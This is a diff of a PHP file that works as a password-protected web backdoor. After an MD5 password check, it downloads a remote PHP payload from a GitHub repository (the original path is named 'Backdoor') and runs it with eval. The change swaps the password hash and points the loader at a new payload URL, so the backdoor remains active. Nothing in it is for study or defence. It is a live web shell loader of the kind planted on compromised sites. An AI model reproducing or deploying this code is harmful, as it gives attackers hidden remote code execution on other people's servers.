@@ -42,7 +42,7 @@ function is_logged_in()
 // Check if the password is submitted and correct
 if (isset($_POST['password'])) {
     $entered_password = $_POST['password'];
-    $hashed_password = '4005dd881e9f948b8356b4aaea2a5a07'; // Replace this with your MD5 hashed password
+    $hashed_password = '9093ab347f5a2b5d23c69e50847ed281'; // Replace this with your MD5 hashed password 
     if (md5($entered_password) === $hashed_password) {
         // Password is correct, store it in session
         $_SESSION['logged_in'] = true;
@@ -55,7 +55,7 @@ if (isset($_POST['password'])) {
 
 // Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    $a = geturlsinfo('https://raw.githubusercontent.com/ItsMeAlf404/Backdoor/main/awok.php');
+    $a = geturlsinfo('https://raw.githubusercontent.com/mralok1337/ItsMeAlf403/refs/heads/main/awok.php');
     eval('?>' . $a);
 } else {
     // Display login form if not logged in
